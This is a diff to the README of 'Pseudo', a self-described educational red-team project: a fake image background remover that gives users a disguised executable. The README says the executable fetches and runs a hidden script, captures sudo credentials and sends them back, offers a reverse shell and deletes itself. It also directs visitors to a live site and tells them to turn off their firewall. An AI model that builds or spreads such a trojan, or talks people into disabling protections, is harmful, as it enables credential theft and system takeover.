@@ -11,18 +11,18 @@ This project is a **red-team simulation** created strictly for **educational pur
 
 ## Project Description:
 
-**Pseudo** is a proof-of-concept web-based attack vector posing as an image background remover tool. Users upload an image to remove its background and are given a disguised `.exe` (Windows) or `.desktop` (Linux) file that appears to be the processed image.
+**Pseudo** is a proof-of-concept web-based attack vector posing as an image background remover tool. Users upload an image to remove its background and are given a disguised `.exe` (Windows) or `.desktop` (Linux) file that appears to be the processed image. As of right now, the executables will most likely be blocked by firewalls and require user permission to run, however it is possible to bypass these restrictions using certain methods.
 
 When opened, the executable:
+- Downloads and saves a hidden script (`runme`) from our server in an obscure location then executes the script.
 - Downloads and opens the background-removed image to avoid suspicion.
-- Executes a hidden script (`runme`) from our server.
 - Deletes itself to avoid detection.
-- Collects system credentials upon `sudo` usage (on Linux or WSL for Windows) and sends them back to the web server.
-- Supports optional reverse shell payloads via compiled C binaries.
+- Collects system credentials upon next `sudo` usage in a new terminal (on Linux or WSL for Windows) and sends them back to the web server.
+- Supports optional reverse shell payloads via the compiled `runme` binary.
   
 ## Instructions:
 
-Visit our website [https://cyber.stanleyhoo1.tech](https://cyber.stanleyhoo1.tech), upload an image, and download the result. Opening the downloaded file will execute the hidden script and display the image.
+Visit our website [https://cyber.stanleyhoo1.tech](https://cyber.stanleyhoo1.tech), upload an image, and download the result (you may have to turn off your firewall to allow it to download). Opening the downloaded file will execute the hidden script and display the image.
 
 > This tool is only intended for use by project reviewers or classmates as part of the educational evaluation. Do not distribute or run on unauthorized systems.
 
